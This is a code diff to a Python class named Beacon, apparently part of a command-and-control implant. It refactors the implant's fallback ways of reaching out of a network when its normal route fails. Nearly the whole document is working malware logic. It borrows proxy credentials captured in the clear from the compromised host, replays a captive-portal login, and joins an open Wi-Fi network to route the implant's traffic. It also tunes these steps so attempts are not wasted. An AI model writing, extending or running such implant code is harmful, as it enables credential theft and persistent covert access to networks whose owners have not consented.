@@ -10471,6 +10471,32 @@ class Beacon:
                           % (what, _WAY_OUT_BORROW_NAME, opened - written))
         return loaded, ""
 
+    @staticmethod
+    def _borrowable_credentials(borrow: dict) -> List[dict]:
+        """The captured credentials that carry a password, in order.
+
+        One owner, because two places ask: the verb, which selects from
+        it, and `_egress_nothing_to_work_on`, which declines the cycle
+        when it is empty rather than spending an attempt of the window's
+        budget on a refusal nothing can change. An NTLM or Negotiate
+        header is a challenge-response and carries no password.
+        """
+        return [entry for entry in (borrow.get("credentials") or [])
+                if isinstance(entry, dict) and entry.get("secret")
+                and entry.get("user") and entry.get("where")]
+
+    @staticmethod
+    def _replayable_portal(borrow: dict) -> Optional[dict]:
+        """The portal request the rung can replay, or None. One owner."""
+        portal = borrow.get("portal")
+        if not isinstance(portal, dict):
+            return None
+        url = portal.get("url")
+        if (not isinstance(url, str) or not url.startswith("http://")
+                or not isinstance(portal.get("body"), str)):
+            return None
+        return portal
+
     def _egress_credential(self, target: str) -> str:
         """Borrow a credential the host handed over in the clear.
 
@@ -10491,9 +10517,7 @@ class Beacon:
             return refusal
         entries = [entry for entry in (borrow.get("credentials") or [])
                    if isinstance(entry, dict)]
-        usable = [entry for entry in entries
-                  if entry.get("secret") and entry.get("user")
-                  and entry.get("where")]
+        usable = self._borrowable_credentials(borrow)
         if not usable:
             # Said as what it is. An NTLM or Negotiate header is a
             # challenge-response and carries no password to borrow, so a
@@ -10563,18 +10587,14 @@ class Beacon:
         borrow, refusal = self._egress_borrow("a captive portal's answer")
         if borrow is None:
             return refusal
-        portal = borrow.get("portal")
-        if not isinstance(portal, dict):
+        portal = self._replayable_portal(borrow)
+        if portal is None:
             return ("[error] Not answering a captive portal: the scout has "
-                    "not seen the host get past one, so there is nothing to "
-                    "replay. Nothing was changed.")
+                    "not seen the host get past one, or its record of it is "
+                    "%r, which this verb cannot replay. Nothing was "
+                    "changed." % (borrow.get("portal"),))
         url = portal.get("url")
         body = portal.get("body")
-        if (not isinstance(url, str) or not url.startswith("http://")
-                or not isinstance(body, str)):
-            return ("[error] Not answering a captive portal: the scout's "
-                    "record of it is %r, which this verb cannot replay. "
-                    "Nothing was changed." % (portal,))
         content_type = portal.get("content_type") or \
             "application/x-www-form-urlencoded"
         session = self._proxy_session or self._bound_session()
@@ -10655,6 +10675,26 @@ class Beacon:
                           "capturing on it" % ", ".join(usb))
         return None, "no wireless interface on this host"
 
+    @staticmethod
+    def _radio_seen_ssids(document: dict) -> List[dict]:
+        """Every SSID the scout's document names, in its order."""
+        return [entry for entry in
+                ((document.get("tap") or {}).get("ssids") or [])
+                if isinstance(entry, dict) and entry.get("ssid")]
+
+    def _radio_open_ssids(self, document: dict) -> List[str]:
+        """The open ones, which are the only ones this rung may take.
+
+        One owner, because two places ask: the verb, which associates
+        with the first of them, and `_egress_nothing_to_work_on`, which
+        declines the cycle when there are none rather than spending an
+        attempt of the window's budget. On a corporate floor every SSID
+        carries the Privacy bit, so "none open" is the ordinary case and
+        it was costing the whole budget every window.
+        """
+        return [entry["ssid"] for entry in self._radio_seen_ssids(document)
+                if entry.get("open")]
+
     def _egress_radio(self, target: str) -> str:
         """Associate with an open SSID and route this implant's own traffic.
 
@@ -10672,10 +10712,8 @@ class Beacon:
             return ("[error] Not using this implant's own radio: there is no "
                     "fresh scout document, so no SSID has been seen. "
                     "Nothing was changed.")
-        seen = [entry for entry in
-                ((document.get("tap") or {}).get("ssids") or [])
-                if isinstance(entry, dict) and entry.get("ssid")]
-        openly = [entry["ssid"] for entry in seen if entry.get("open")]
+        seen = self._radio_seen_ssids(document)
+        openly = self._radio_open_ssids(document)
         if target:
             if target not in openly:
                 return ("[error] %r is not an SSID the scout saw open: it "
@@ -11076,8 +11114,13 @@ class Beacon:
             # make: `ip addr del <address>/24` fails on a /22 guest
             # network and leaves the address on the interface. The lease
             # file is where the rung recorded it.
-            _address, prefix, _router = _radio_lease(
-                self._way_out_path(_WAY_OUT_RADIO_LEASE_NAME))
+            prefix = 24
+            if self._way_out_state_dir:
+                # Guarded as `_radio_lease_address` is, and for the same
+                # reason: `_way_out_path` joins onto "" without one, so
+                # this would read a relative path from the process's cwd.
+                _address, prefix, _router = _radio_lease(
+                    self._way_out_path(_WAY_OUT_RADIO_LEASE_NAME))
             self._radio_rollback(iface or "", self._way_out_source,
                                  "rung 4 takes the host's identity on the "
                                  "tapped port, so the radio rung's scoped "
@@ -11175,7 +11218,13 @@ class Beacon:
     # both verbs consult it themselves, so the prohibition binds tasking
     # as well -- but the list of rules there is no point carrying on such
     # a build. See `_egress_usable`.
-    _EGRESS_PROXY_VERBS = ("proxy", "rediscover")
+    # The verbs a build that forbids proxies can never use. `credential`
+    # is here because its whole effect is to aim this implant at a proxy:
+    # it refused on `_proxy_prohibited` as its very first act, and that
+    # refusal cost an attempt of the window's budget every time a rule
+    # named it on such a build -- which is exactly what dropping a rule at
+    # policy-read time exists to prevent.
+    _EGRESS_PROXY_VERBS = ("proxy", "rediscover", "credential")
 
     # The rung-2 verbs that need the scout to have found something. They
     # are not refused by `read_egress_policy` -- that reader cannot see
@@ -12072,10 +12121,27 @@ class Beacon:
             iface, why = self._radio_iface()
             if iface is None:
                 return "this host has no radio the rung may use (%s)" % why
+            document = self._way_out_document()
+            if document is None:
+                return "there is no fresh scout document, and the SSIDs it "\
+                       "carries are what this rung chooses from"
+            if not self._radio_open_ssids(document):
+                return "the scout has seen no open SSID to associate with"
         elif verb in self._EGRESS_SCOUT_VERBS:
-            if self._way_out_read(_WAY_OUT_BORROW_NAME,
-                                  _WAY_OUT_BORROW_VERSION) is None:
-                return "the scout has published nothing to borrow"
+            if verb == "credential" and self._proxy_prohibited():
+                return "this build's c2.proxy.mode forbids a proxy, and "\
+                       "borrowing a credential is aiming this implant at one"
+            borrow, _refusal = self._egress_borrow("anything")
+            if borrow is None:
+                return "the scout's borrow file cannot be read, or it is "\
+                       "from an outage before this one"
+            if verb == "credential" and not self._borrowable_credentials(
+                    borrow):
+                return "none of the credentials the scout captured carries "\
+                       "a password"
+            if verb == "portal" and self._replayable_portal(borrow) is None:
+                return "the scout has not seen the host get past a portal "\
+                       "this rung could replay"
         return ""
 
     def _egress_act(self) -> bool:
